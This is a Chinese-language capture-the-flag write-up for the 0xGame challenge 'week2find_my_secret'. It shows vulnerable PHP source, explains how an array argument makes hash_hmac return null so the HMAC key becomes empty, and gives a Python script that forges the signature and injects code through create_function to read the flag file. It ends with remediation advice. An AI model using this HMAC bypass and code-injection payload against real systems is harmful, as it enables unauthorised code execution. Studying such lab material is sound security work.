# week2find_my_secret

## 题目简述

接口先用环境变量中的秘密值计算两层 HMAC，校验通过后又把用户给出的函数名作为可调用对象执行。通过 PHP 旧版本对错误参数类型的处理，可以让第一层 `hash_hmac()` 返回 `null`，把第二层变成空密钥 HMAC；随后利用 `create_function()` 的代码拼接实现执行任意 PHP 语句。

## 解题过程

源码的关键流程是：

```php
$secret_key = getenv('secret');
$secret_key = hash_hmac('sha256', $_POST['N1k0la'], $secret_key);
$payload = hash_hmac('sha256', $_POST['Pupi1'], $secret_key);

if ($payload === $_POST['Poria']) {
    $_POST['action']('', $_POST['Pupi1']);
}
```

题目运行在 `hash_hmac()` 遇到数组参数会告警并返回 `null` 的旧 PHP 环境中，且错误被抑制。令 `N1k0la` 为数组后，未知的环境密钥被替换为 `null`；第二层结果就等价于以空字节串为密钥计算 `HMAC-SHA256(Pupi1)`，可以在本地得到正确的 `Poria`。

将 `action` 设为旧版 PHP 的 `create_function`。该函数会把第二个参数拼入函数体，因此用 `};` 提前闭合函数、执行 `readfile()`，再以 `/*` 注释剩余代码：

```python
import hashlib
import hmac
import requests

target = "http://challenge/"
code = '};readfile("fllllllaaaaaaaaag.php");/*'
signature = hmac.new(b"", code.encode(), hashlib.sha256).hexdigest()

response = requests.post(
    target,
    data={
        "N1k0la[]": "x",
        "Pupi1": code,
        "Poria": signature,
        "action": "create_function",
    },
    timeout=5,
)
print(response.text)
```

响应中得到：

```text
0xGame{wow_u_really_find_my_secret}
```

## 方法总结

利用链为“数组触发类型错误 → 秘密 HMAC 密钥退化为空 → 本地计算校验值 → 动态调用 `create_function()` → 闭合函数体执行代码”。该链依赖旧 PHP 行为；现代 PHP 已移除 `create_function()`，并会对许多错误类型参数抛出 `TypeError`。根本修复仍是严格校验参数类型、拒绝用户控制可调用函数名，并使用固定的代码路径。
